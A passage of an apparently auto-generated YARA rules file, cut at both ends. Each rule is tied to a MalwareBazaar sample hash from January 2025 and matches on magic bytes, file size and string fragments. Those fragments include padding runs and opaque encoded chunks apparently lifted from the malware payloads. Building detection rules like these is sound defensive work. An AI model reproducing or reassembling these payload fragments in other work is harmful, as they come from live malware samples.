      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429"
   strings:
      $x1 = "<<BASE64_START>>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s6 = "yoCBA0wD9NgAioCBA0wD7JgHqQAANUxeC4hKEAQDUsnAeoCBA0gE7JgHqQAANExeC4hKEAQDZ03ACIiKEAQDZsnAeoCBA0gF7JgHqQAANESfDIgIqQAANEyeC4hKEAQD" ascii
      $s7 = "DUmPOMKAAwgqAEwEoFQ4AAAADUmNOMKAAcpnAEgEpFQ4AAAADQG5OMKAAggtAEAZdnQ4AAAADQG3OMKAAAQPAEATNGQ4AAAAAwL1OMKAAcpkAEAZAlQ4AAAADQG3OMKA" ascii
      $s8 = "fBgAK0YEeBQAK0YEdBgAKsYEcBQAKsYEbBgAKkYEaBQAKkYEZBgAKcYEYBQAKcYEXBgAKUYEWBQAKUYEVBgAKMYEUBQAKMYETBgAKEYESBQAKEYERBgAK8XEQBQAK8XE" ascii
      $s9 = "EcPKCIABAMQE9ZAAH07bEAwAJsnACQAADMRfGAwB8+GBAMQC7JgAEAwAP0nBAcwuvRAADkweCIgBAcQuvZAAEwMKCQAADExeCQAADMxeCQAAD8weCQAADkweCQAAD8Qf" ascii
      $s10 = "u9Wa0FWZyN0azFGVuIXZsVHZlh2YTt2chRlLyMjbpdlL0Z2bz9mcjlWTqUFABQDvBGhBEQbgRAAKF4gD0GYEBMAIIQbgRAAIFQbgRYABINoEMGoEBACCcg0gSEAIGg0g" ascii
      $s11 = "GMgAEAACN0nBAgysvdgBAYhsvNgAMYAApM0bBIBASQAAIExeCYAAWE7bDQAAIsQfDIABAgAE9NgAEAACK0HBCQAAIERfEIgBAQRsoIQEAEQdAAAAyBQBwMBAAoiJrAAA" ascii
      $s12 = "sUiBA4gaocgBA4QcvZAAr4EKXQwACMgAmkTLAsiFDsyFDwSJGAgDqhyBGAgDv9mBAsiTocBBDIwACsgBAYxBvRwBtAwKXMwKWMALEIRLAsiFDsyFDwyBLQAAGExeCoiB" ascii
      $s13 = "MUTExERACAyBJABWRARCYFBECwlECYAAPAAbAwGAkBgLAkGAwBQYAMHAkBAdA4mF/////TACGIAAsBAbAQGAuAgMAMDAsBQZA4GAyBQZAsEGAwGAsBAZA4CAyAwMAkGA" ascii
      $s14 = "22222222222222222222222222222222222222222222222222" ascii /* hex encoded string '"""""""""""""""""""""""""' */
      $s15 = "AAAAAAAAAACB" ascii /* base64 encoded string '        ' */
      $s16 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s17 = "AAAAAABAAA" ascii /* base64 encoded string '     @ ' */
      $s18 = "AAAAADAAAC" ascii /* base64 encoded string '    0  ' */
      $s19 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s20 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string '          ' */
   condition:
      uint16(0) == 0xd8ff and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule sig_62cbd2052c88f5415bfddb88b997a150c29cba2f851f0866f40eb87f993c338d {
   meta:
      description = "evidences - file 62cbd2052c88f5415bfddb88b997a150c29cba2f851f0866f40eb87f993c338d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "62cbd2052c88f5415bfddb88b997a150c29cba2f851f0866f40eb87f993c338d"
   strings:
      $x1 = "=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s4 = "AAAAAAAAAAAA4" ascii /* base64 encoded string '         ' */
      $s5 = "eAAAAAAAAAAAA" ascii /* base64 encoded string 'x        ' */
      $s6 = "Qao5/YjujIrcSpYy5c/H6fRVCQSjE3nGQETuHtPtTGyFBmerTgDelZj3nLwZEn0Xh71Cb66u0LHbddyhmIs0RK6cHCpRrkcb2xyvIaVKflLgrTV9v8ehY4LAUGWzAz6j" ascii
      $s7 = "rTgDYoeJ0a8/LoLewZrsy2hN3xsoerTgDMGUTEAQK8WDjBLs31hNe3AuVnmfeMWw1FTPzlkZo2QYP1jbSSDlMnZSB349bKniTNxHEI60AVKJCerTgDGAdhgX1QNQueyE" ascii
      $s8 = "eGKti0zqvhilWQskRzK1P1ErMa9d2Fdy4NirCBuKRSzl3iORh6Jys36EnevrYplnByHzb5j/FFrSGedlL7oXdtcQsW3sxeb975Xy13pdsvMdduzjvsG79b98hA5dEOFu" ascii
      $s9 = "ao5EwbrFhEcm8IRLAEYEC3lBjhMF1/kRmv1MuNU5LhFm6/zupF2eisewpkaOvMs76SJ65zPEzQb9erlllcJerTgD40ft7AA5cfoaPz2D38TuLLp8yMMMmMM/8DwMVavu" ascii
      $s10 = "yBnbrLyG2Jc/zoAqAklXwmUviiNgXfv07zOOk1ygAvOP3duUZCzerTgDblTAGc4gx8ekNGYOU17Aazjc9lnuVQWmS36QerTgDhmSj9VYHCtj8cieyE6x/YC8DtEMcokm" ascii
      $s11 = "TgDUJl7o3QucaIzHP56uOWAiaxJe06gtN8ExecvWKKXg6xb3Qwluj23mDqzxBRXy4SvnuHGXIFLhjExgap9Rygt3BacQ8qnjSKZ8Lt2UUm/HBdq8UerTgDRnzX4erTgD" ascii
      $s12 = "2SctKzG1S1bQIqm2kt8nK/dM4go/2NFx7fdra4DZCH6AeBxNtf0Qnae6dDnlW2IwAySOdpXSPqQmYpmchtmv9J8SwtnDMWyIDouSerTgDCtJSerTgDQaV1aIspydeur8" ascii
      $s13 = "YzIfePG5bSoT5KEyebQhjtPE42YLRuZferTgDdBO8Y4ykJerTgDHbAx5AGh8H2on2XQ3cgwbI/3aj9uGN4pj75sOFqjrNsZy4GaLsIwdYwaFEZ094qF17HSCqQaGDYjH" ascii
      $s14 = "090X0kbbQT8O0NxjvBZTvVbZ726ovCo6ZfarW6ngHMEteCrM1PerTgDQyEYl2Ldv/AGS9KwEi3iQofBfTptQMH871HtvwSpAWNfCGJPK/f0loeKulYOx6BQmVRTrE5O2" ascii
      $s15 = "C2Wsc5lCssVSPItH/hLXkPdBm2wBgglsamS6erTgDhTa4XriFoU6bn0cberTgDFH2Fw5O1erTgD7w0dBLNYxwU8/LbcbGqe/093e6Bbqqhg1DL1qBfrRkLD3oKKeye9e" ascii
      $s16 = "cKsH0l68WTBKGEerTgDGVpso5erTgDRCcMhrwJUfvQ9RswuOTAAUuyaerTgDb3IR3Fe7jddln/y5execK6S/hxDHT8LSMYjkTZjkn9nXLmr2V3yxH9sie3iUAg2h7CwK" ascii
      $s17 = "4hd/43eU0J5mX/9VRP5waerTgDLPRbfh/SA/Wz2veXEc4FmlBFUs8fCrwFXu5r5k61AjOevpiLRa6uSjrOUYYJHkJi6uevvFNaSlm5ky3MpOaf723D2qbF6EferTgD6D" ascii
      $s18 = "Ndi64usn0/4v72U0HbnqUgy8jmj3dORhqVOmdTGCibO68ferTgDKdK3sjKF9EF6ziW3LduhRHkCW28ESvybFvkEyEWzR0zSBOX2LRVW1MyFqzQ5c3SBVterTgDD9hUpT" ascii
      $s19 = "9CmSJJFrVXilSWu9aExeCUg777Iz0YNxuyLg9uBKLO1Av7ijIsd2nGzvz0XS/7btVBy24HerTgDXLmHahcShMXSp4MILQcPSyvsf7erTgDb7z5PWoTcIsUerTgD0LWlp" ascii
      $s20 = "CEvU3c05O0mCHzNKiLpCrflWZdttHVej9EXlMZK9X8ezTEmp4Pn0eS0Dal4BFht5jQsM1cq61D76L2RW9lDjdecpE8VpkLKTfb/F/G2pQHrWKf6/2A337BOTV0L6g1Da" ascii
   condition:
      uint16(0) == 0x413d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb {
   meta:
      description = "evidences - file 69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s5 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAEA" ascii /* base64 encoded string '                   @' */
      $s7 = "AAEAAAAAAAEAAAAAA" ascii /* base64 encoded string ' @     @    ' */
      $s8 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s9 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s10 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s11 = "39GZ0VHaTRXZrN2bTBAdyFGdzVmUAMXby9mRuM3dvRmbpdlLtVGdzl3UAQ2boRXZNVmchBXbvNEAzdmbpJHdTBAch1GdpJEAlx2ZuFGdjVmUAUmepNFAzNWaoBXYydEA" ascii
      $s12 = "AkXZLJWdTVGdlxWZEBgclNXV05WZyJXdD9FdldGA5V2S5JHdzl2ZlJFAyMjbpdlL0Z2bz9mcjlWTAknc0NXanVmUfRXZnBQe49mcQlnc0NXanVmUAMXZjlmdyV2U51kL" ascii
      $s13 = "ldlLtVGdzl3U0AQAh5gDO4QAEAyBA4RAHQAAeEgCEAgHAEAEF4QAHMQFSEwBEEXEVIRAAYACBcwACEwBDwBHBAABAAgclRXdw12bD5SeNtAABABAAMXZjlmdyV2UiV2V" ascii
      $s14 = "AAAAFAgBAEAAEkwvJQaCkmglJ8XCblgSJMSCdMwBJIRCLAAnJYgA3jw6CMPCUjQtIgHCnhwWIkCCTcQ/HY9ByeAmH84BndgHFoZBaaA9GgXBSXQvFoZBvWgmFAZBMVgL" ascii
      $s15 = "pEQGAE3DaEQyAo8DNEQSAMRA2EQyEcjD8HQwEcWA2AQQCERA2EQkEgFBNAQMCERA2AQiEIlDYDQME0kDOHQOEgkD7CQMEgkDlCQMAMRA2AQOEsTA2AQMDYZA2AQSAMRA" ascii
      $s16 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */
      $s17 = "BMWD6AgBKIfDeAgCKIfDSAgCBMWDIAgBKcMDrDgBKcMDSDgBBMGDJCgBAMBD1BgCLsHDaBgBBMGDEBgBMEBDwAgBAMxC2DgCBM2CdDgBBM2C5CgBLs3CbCgBLk0CmBgD" ascii
      $s18 = "DEATAAQRQBAAAAAAAAAJK0QDuUGZv1GIT9ERg4Wag4WdyBSZiBCdv5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s19 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s20 = "uAjLw4CNxgQZ0FGbw1WZUlXTKAQAY4gDBIAIFAAAAAAABAQAIUVEBEAIFAAAAEABAAAACQAgAAAAEQUEGMQCGIAGYgAGDAiBpIBGBASBcUkEYgBCpIRBgoAGcEgAgUQP" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e0731ae98d {
   meta:
      description = "evidences - file 7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e0731ae98d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e0731ae98d"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s5 = "DAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s6 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s7 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s8 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s9 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s10 = "AEBAAAAAAAAAAAA" ascii /* base64 encoded string ' @@        ' */
      $s11 = "AAAAAAAAAADAA" ascii /* base64 encoded string '       0 ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string '                   ' */
      $s13 = "TRjNlNXYC12byZEA0JXZ252bDBgb39GZ0VHaTBgb39GZ0VHaTRXZrN2bTBAdyFGdzVmUAMXby9mRuM3dvRmbpdlLtVGdzl3UAQ2boRXZNVmchBXbvNEAzdmbpJHdTBAc" ascii
      $s14 = "uMHbvN2b09mcQ5yclNWa2JXZT5iYldlLtVGdzl3U0AQAh5gDO4QAEAyBA4RAHQAAeEgCEAgHAEAEF4QAHMQFSEwBEEXEVIRAAYACBcwACEwBDwBHBAABAAgclRXdw12b" ascii
      $s15 = "F8qcoMjFKAAALhiFwBQBvK3ERAAACILOGAAAmgCcAUQpy9wMWoAAAsEKWAHAFUqcTEBAAIQ04Ag3KAAAlgiBAAgJooAAAICKKAAAQiiCAAAlvhQEKAAAQiCBAAAH+pAA" ascii
      $s16 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */
      $s17 = "f1URUNVWT91UFBARFJVSVFVRS9VWBxEUTlERfNVRAMVVPVlTJRlTPN0XTVEAf9VZ1xWY2BQb15WRAUWbpR1dkBQZ6l2UiNGAlBXeUVWdsFmVAU2avZnbJBAdsV3clJ1Y" ascii
      $s18 = "EbFE0AAAAAAAA" ascii /* base64 encoded string 'lQ4      ' */
      $s19 = "4AAAAAAAAAEBA" ascii /* base64 encoded string '       @@' */
      $s20 = "BYjARQw1MEVAZAQxPofAJRAyPsnABQQwBYjABQwuPwUA5TQrPQRAxHQ9O4fApTwmC0UAZTQlOceAhLgnBYTARTQhMEVAZAQcC0UAJHwBOMaAJBQcOMZABTwfOUYAJRQe" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d5bc963 {
   meta:
      description = "evidences - file c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d5bc963.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "c500c57e5466aa0174f0a2f4975b72e50f0f4dc52e89b41fe0e62daa0d5bc963"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s4 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                               ' */
      $s5 = "AAAAADAAAC" ascii /* base64 encoded string '    0  ' */
      $s6 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ' */
      $s8 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s9 = "ADAAAAAAAF" ascii /* base64 encoded string ' 0     ' */
      $s10 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                            ' */
      $s12 = "AAAAADAAAB" ascii /* base64 encoded string '    0  ' */
      $s13 = "AAAAAAAADA" ascii /* reversed goodware string 'ADAAAAAAAA' */
      $s14 = "AAAAADAAAD" ascii /* base64 encoded string '    0  ' */
      $s15 = "AAAAADAAAE" ascii /* base64 encoded string '    0  ' */
      $s16 = "AAAAAAAAAAAC" ascii /* base64 encoded string '        ' */
      $s17 = "AAAAAEAAAEAAAA" ascii /* base64 encoded string '    @  @  ' */
      $s18 = "M4NAebyAe///erTgDHzPGAAAqerTgDWBRYQEGMBWXYQEKAAAz82BRYACtoAAAoCKGAQA5gyBRcwKUMQLHEBAebyAebAABYzbZhwn/V/91CIAhoAAAIDKJIRCToAAAEDK" ascii
      $s19 = "YA8A8IwEYA6A8IwEYE2A8IwEYE0A8IwEYEyA8IwEYEwA8IwEXEerTgDA8IwEXE8A8IwEXE6A8IwEXE4A8IwEXE2A8IwEXE0A8IwEXEyA8IwEXEwA8IwEWEerTgDA8IwE" ascii
      $s20 = "B0gEVQPgSEQCSUxCHkiDOIQHBGRFHEwEAMhAdEYEVAAIL4gDCkRgRUxBBMBATIQGBGRFAAyCO4gDC0RgRUhDOIQGBGRFDcQEOEQVSURABACCBMBATEgAgcgDOIQFBKRF" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d {
   meta:
      description = "evidences - file fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d"
   strings:
      $x1 = "=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s6 = "A0wD7JgHqQAANUxeC4hKEAQDUsnAeoCBA0gE7JgHqQAANExeC4hKEAQDZ03ACIiKEAQDZsnAeoCBA0gF7JgHqQAANESfDIgIqQAANEyeC4hKEAQDg03ACIiKEAQDgsnA" ascii
      $s7 = "AMpBAEwEYjhhAAAADUGYOQKAAwQyAAAj7hghAAAADU2VOQKAAggtAAAjxhghAAAADU2TOMKAAMpBAAgcrhghAAAADUmROMKAAMJAAAgcihghAAAADUmPOMKAAwgqAEwE" ascii
      $s8 = "uIXZsVHZlh2YTt2chRlLyMjbpdlL0Z2bz9mcjlWTqUFABQDvBGhBEQbgRAAKF4gD0GYEBMAIIQbgRAAIFQbgRYABINoEMGoEBACCcg0gSEAIGg0gSEQZBKRFIEwEBUWg" ascii
      $s9 = "dBgAKsYEcBQAKsYEbBgAKkYEaBQAKkYEZBgAKcYEYBQAKcYEXBgAKUYEWBQAKUYEVBgAKMYEUBQAKMYETBgAKEYESBQAKEYERBgAK8XEQBQAK8XEPBgAK0XEOBQAK0XE" ascii
      $s10 = "H07bEAwAJsnACQAADMRfGAwB8+GBAMQC7JgAEAwAP0nBAcwuvRAADkweCIgBAcQuvZAAEwMKCQAADExeCQAADMxeCQAAD8weCQAADkweCQAAD8QfUIwBrQAAD8QfUIAE" ascii
      $s11 = "vdgBAYhsvNgAMYAApM0bBIBASQAAIExeCYAAWE7bDQAAIsQfDIABAgAE9NgAEAACK0HBCQAAIERfEIgBAQRsoIQEAEQdAAAAyBQBwMBAAoiJrAAAvhCFHQAAI8AfCsgB" ascii
      $s12 = "BAABIABCYgTEcJhAFAwCJgBGCAQBcJBE8EBMRgBKRwlECYAAPIQAcJBEwEBXSIwAAogFBgBEOIgAAYAGYkAWRAhAcJhAGAADAAAAAAQAAAAADAQAMUTExERACAyBJABW" ascii
      $s13 = "AAAAAAAAAACB" ascii /* base64 encoded string '        ' */
      $s14 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s15 = "AAAAAABAAA" ascii /* base64 encoded string '     @ ' */
      $s16 = "AAAAADAAAC" ascii /* base64 encoded string '    0  ' */
      $s17 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s18 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string '          ' */
      $s19 = "AAAAAEAAAA" ascii /* base64 encoded string '    @  ' */
      $s20 = "AAAAAAAAAADC" ascii /* base64 encoded string '       0' */
   condition:
      uint16(0) == 0x413d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule sig_9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a {
   meta:
      description = "evidences - file 9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a"
   strings:
      $x1 = "=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                 ' */
      $s5 = "QCJkQCJkQC5XrrycEo/gOHwypMdiqX3y5EEerTgDverTgDAEkQ3i3HjD047DQQCdLCJkQCJkQCZyxMw4DuttP8EdIRCbLOgw2TBJEtIT0JdhgXHB9PoAGPYRUwCTIacw" ascii
      $s6 = "AMkh0CwQ4hEAD93SAMEbhBwQvlEADh2WAMkamCwQu9LAD5G5AM0bCCwQtxMADhWnAMUbeAwQsxLAD1mhAMUa2CwQrZBAD9mEAM0ayDwQqtFADtWRAMUaPCwQt9FADxWc" ascii
      $s7 = "AIJJM2IwSerTgDARkwUiAAQAwQCjNiCJMtDAAAAA4QCRHDcMIRCRJCAABQHJE2IVkQUiAAAAgSChNyFJElIAAwAAkQYjQRCRJCAAAAJJE2YyxAerTgD/QCJkQCJkQCJk" ascii
      $s8 = "AAAAAAAAAAAAB" ascii /* base64 encoded string '         ' */
      $s9 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s10 = "RERERERERERERERERERERERERERERERERERERABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABE" ascii /* base64 encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDD D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                 ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 @  @            ' */
